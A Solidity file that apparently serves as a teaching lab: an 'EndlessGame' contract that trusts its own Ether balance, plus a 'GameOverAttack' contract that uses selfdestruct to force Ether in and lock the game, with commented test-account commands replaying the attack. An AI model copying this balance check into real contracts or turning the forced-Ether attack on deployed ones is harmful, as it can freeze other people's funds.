pragma solidity >=0.4.20 <0.8.0;

contract EndlessGame {
  uint public targetAmount = 11 ether;
  address public winner;

  function deposit() public payable {
    require(msg.value == 1 ether, "You can only send 1 Ether");
    uint balance = address(this).balance;
    require(balance <= targetAmount, "Game is over");
    if (balance == targetAmount) {
      winner = msg.sender;
    }
  }

  function claimReward() public {
    require(msg.sender == winner, "Not winner");
    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
    require(sent, "Failed to send Ether");
  }
}

contract GameOverAttack {
  EndlessGame endlessGame;
  constructor (EndlessGame _endlessGame) public {
    endlessGame = EndlessGame(_endlessGame);
  }
  function attack() public payable {
    address payable addr = payable(address(endlessGame));
    selfdestruct(addr);
  }
}



//e = EndlessGame.deploy({'from': accounts[0]})
//e.deposit({'from': accounts[1], 'value': 1000000000000000000})
//e.deposit({'from': accounts[2], 'value': 1000000000000000000})
//e.deposit({'from': accounts[3], 'value': 1000000000000000000})
//e.deposit({'from': accounts[4], 'value': 1000000000000000000})
//e.deposit({'from': accounts[2], 'value': 1000000000000000000})
//e.deposit({'from': accounts[3], 'value': 1000000000000000000})
//e.deposit({'from': accounts[4], 'value': 1000000000000000000})
//e.deposit({'from': accounts[1], 'value': 1000000000000000000})
//a = GameOverAttack.deploy(e.address,{'from': accounts[2]})
//a.attack({'from': accounts[2], 'value': 3000000000000000000})
